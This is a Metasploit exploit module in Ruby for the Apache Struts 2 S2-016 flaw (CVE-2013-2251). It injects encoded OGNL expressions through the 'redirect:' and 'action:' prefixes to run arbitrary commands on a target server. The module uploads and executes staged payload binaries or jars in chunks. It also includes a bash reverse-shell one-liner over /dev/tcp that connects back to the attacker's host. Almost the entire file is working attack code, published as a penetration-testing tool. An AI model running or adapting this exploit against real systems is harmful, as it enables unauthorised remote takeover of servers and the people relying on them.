##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Remote Command Execution in Apache Struts 2.0.0 - 2.3.15 DefaultActionMapper (S2-016)',
			'Description'    => %q{
				Struts 2 before 2.3.15.1 the information following "action:", "redirect:" or
				"redirectAction:" available in Struts 2 DefaultActionMapper is not properly sanitized.
				In addition with any following information will be evaluated as OGNL expression against
				the value stack resulting in command injection.

				This module demonstrates remote command execution on supported platform. In Payload
				construction currently supports OGNL double evaluation syntax both %{} and ${} as
				well as three variants of DefaultActionMapper which is "redirect:", "action:" and
				"redirectAction:"

				In additon, this module has been tested successfully on Apache Struts 2.3.15 over
				Apache Tomcat 7 on Red Hat Enterprise Linux 5 and Mac OS X Lion (10.7.5 X86_64)
				operating systems
			},
			'Author'         =>
				[
					'Takeshi Terada', # Vulnerability discovery
					'sinn3r',       # Original metasploit module for DefaultActionMapper
					'juan vazquez', # Original metasploit module for DefaultActionMapper
					'mihi', # Original ARCH_JAVA support
					'Lersak Limwiwatkul <lersak[@]gmail.com>' # Remote command execution support
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2013-2251' ],
					[ 'OSVDB', '95405' ],
					[ 'BID', '61189' ],
					[ 'URL', 'http://struts.apache.org/release/2.3.x/docs/s2-016.html' ]
				],
			'Platform' 	 => [ 'linux', 'osx', 'java' ],
			'Privileged'     => false,
			'Targets'        =>
				[
					[ 'Linux Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux',
						}
					],
					[ 'Mac OS X Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'osx',
						}
					],
					[ 'Java Universal',
						{
							'Arch' => ARCH_JAVA,
							'Platform' => 'java'
						}
					]
				],
			'DisclosureDate' => 'Jul 2 2013',
			'DefaultTarget' => 2))

			register_options(
				[
					Opt::LPORT(4444),
					Opt::RPORT(8080),
					OptEnum.new('HTTPMETHOD', [ true, 'HTTP Method to use, GET or POST', 'GET', ['GET','POST']]),
					OptEnum.new('OGNL_EVAL', [ true, 'OGNL expression opening bracket, % or $', '$', ['$','%']]),
					OptEnum.new('OGNL_ENCODE', [ true, 'Encoding of OGNL expression', 'unicode', ['unicode','octal','none']]),
					OptEnum.new('STRUTS_ACTION', [ true, 'Action of Struts 2 DefaultActionMapper: action, redirect and redirectAction', 'redirect', ['action','redirect','redirectAction']]),
					OptEnum.new('CHUNK_LEN', [ true, 'Chunk\'s length of uploaded code', '100', ['40','80','100','200','400']]),
					OptString.new('TARGETURI', [ true, 'The path to a struts application action i.e. /struts2-showcase/skill/edit.action', ""]),
					OptString.new('CMD', [ false, 'Execute a specific command', "" ]),
					OptString.new("WritableDir", [ true, "A directory where we can write files", "/tmp" ]),
					OptString.new("PARAMETER", [ true, "HTTP GET or POST message", "" ]),
					OptBool.new('REVERSE_SHELL_CMD', [ false, 'Execute the pre-defined reverse bash shell command', false ])
				], self.class)
	end

	def ognl_encode(str, opt = {})
		return str.unpack('U*').map{ |i| "\\u" + i.to_s(16).rjust(4,'0') }.join
	end

	def generate_struts_payload(cmd, opts = {})
		# Initial required parameter
		proof = rand_text_alpha(6 + rand(4))
		tail = rand_text_alpha(6 + rand(4))
		struts_action = datastore['STRUTS_ACTION']
		ognl_eval = Rex::Text::uri_encode(datastore['OGNL_EVAL'])
		ognl_encode = datastore['OGNL_ENCODE']

		# Construct the payload
		case opts
			when 'check'
				ognl = "new java.lang.String('#{proof}')"
			when 'java'
				ognl = cmd
			when 'cmd'
				cmd.gsub!(' ','\',\'')
				cmd.gsub!('@',' ')
				ognl = "(new java.lang.ProcessBuilder(new java.lang.String[]{'#{cmd}'})).start()"
		end

		# Encoding
		if ognl_encode == "unicode"
			ognl = ognl_encode(ognl, "unicode")
		else
			ognl = Rex::Text::uri_encode(ognl)
		end

		# Return generated payload
		payload = "?#{struts_action}:#{ognl_eval}{#{ognl}}=#{tail}"
		return [ payload, proof ] if opts == "check"
		return payload
	end

	def check
		# Initial request parameter
		http_method = datastore['HTTPMETHOD']
		payload, proof = generate_struts_payload(nil, 'check')
		uri = normalize_uri(target_uri.path)

		# Check whether target is reachable
		res = send_request_cgi({
			'uri' => uri,
			'method' => http_method
		})
		if res.nil? or res.code != 200
			print_error("Target is not accessible - #{rhost}:#{rport}#{uri}")
			return Exploit::CheckCode::Unknown
		else
			print_good("#{rhost}:#{rport}#{uri} is reachable")
		end

		# Check the target
		uri << payload
		res = send_request_cgi({
			'uri' => uri,
			'method' => http_method
		})

		# Request and response if verbose is enabled
		vprint_debug("Request:\n#{http_method} #{uri}")
		vprint_debug("Response:\n"+res.to_s)

		# Status of target
		if res and res.code == 302 and res.headers['Location'] =~ /#{proof}/
			return Exploit::CheckCode::Vulnerable
		else
			return Exploit::CheckCode::Safe
		end
	end

	def execute_command(cmd, opts = {})
		vprint_status("Attempting to execute: #{cmd}")
		uri = normalize_uri(target_uri.path)
		http_method = datastore['HTTPMETHOD']

		# Append injected command
		case opts
			when 'java'
				uri << generate_struts_payload(cmd, 'java')
			else
				uri << generate_struts_payload(cmd, 'cmd')
		end

		res = send_request_raw({
			'uri'     => uri,
			'method'  => http_method
		}, 5)

		# Request and response if verbose enabled
		vprint_debug("Request:\n#{http_method} #{uri}")
		vprint_debug("Response:\n"+res.to_s)

	end

	def reverse_shell_cmd_stager
		# Retrieve target machine and port
		target = datastore['LHOST'].to_s
		port = datastore['LPORT'].to_s

		# Embedded one liner reverse shell with shell interpreter
		cmd = "/bin/sh -c /bin/sh@-i@&>@/dev/tcp/HOST/PORT@0>&1@2>&1"
		cmd.gsub!(/HOST/, target)
		cmd.gsub!(/PORT/, port)

		# Execute reverse bash shell command
		execute_command(cmd)
	end

	def java_upload_part(part, filename, append = 'false')
		cmd = ""
		cmd << "new java.io.FileOutputStream('#{filename}',#{append})"
		cmd << ".write(new sun.misc.BASE64Decoder().decodeBuffer('#{Rex::Text.encode_base64(part)}'))"
		cmd << ".close()"
		execute_command(cmd, 'java')
	end

	def platform_specific_stager(platform = {})
		# Define payload properties
		uri = normalize_uri(target_uri.path)
		writable_dir = datastore['WritableDir'] + "/"
		chunk_length = datastore['CHUNK_LEN'].to_i

		# Getting payload
		case platform
			when 'unix'
				@payload_exe = writable_dir + rand_text_alphanumeric(8+rand(8))
				exe = generate_payload_exe
			when 'java'
				@payload_exe = writable_dir + rand_text_alphanumeric(8+rand(8)) + ".jar"
				exe = payload.encoded_jar.pack
		end

		# Uploading the generated payload
		append = 'false'
		print_status("Uploading payload to #{datastore['WritableDir']} on target #{rhost}:#{rport}:#{uri}")
		while(exe.length > chunk_length)
			print(".")
			java_upload_part(exe[0, chunk_length], @payload_exe, append)
			exe = exe[chunk_length, exe.length - chunk_length]
			append='true'
		end
		java_upload_part(exe, @payload_exe, append)
		print("\n"); print_good("Uploading payload completed")

		# Executing payload
		print_status("Executing payload on #{target['Platform']} platform")
		case platform
			when 'unix'
				execute_command("/bin/sh -c chmod@+x@#{@payload_exe}")
				execute_command("/bin/sh -c #{@payload_exe}")
			when 'java'
				execute_command("java -jar #{@payload_exe}")
		end
	end

	def on_new_session(client)
		# Traditional payload
		if client.type != "meterpreter"
			if datastore['REVERSE_SHELL_CMD']
				print_error("Press CTRL+C to exit from this session.")
				return
			else
				print_error("Please use a meterpreter payload in order to automatically cleanup.")
				print_error("The #{@payload_exe} file may be removed manually.")
				return
			end
		end
		# Meterpreter payload
		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
		print_warning("Deleting the #{@payload_exe} file")
		client.fs.file.rm(@payload_exe)
	end

	def exploit
		uri = normalize_uri(target_uri.path)

		# Executing user's command
		if not datastore['CMD'].empty?
			print_status("Executing remote command on #{rhost}:#{rport}:#{uri}")
			execute_command(datastore['CMD'])
			return
		end

		# Executing reverse bash shell command
		if target['Platform'] != "java"
			if datastore['REVERSE_SHELL_CMD']
				print_status("Executing reverse bash shell command on #{rhost}:#{rport}:#{uri}")
				reverse_shell_cmd_stager
				return
			end
		end

		# Executing payload on specific platform
		case target['Platform']
			when 'linux'
				platform_specific_stager('unix')
			when 'osx'
				platform_specific_stager('unix')
			when 'java'
				platform_specific_stager('java')
			else
				fail_with(Exploit::Failure::NoTarget, "Unsupported target platform")
		end
		handler
	end
end

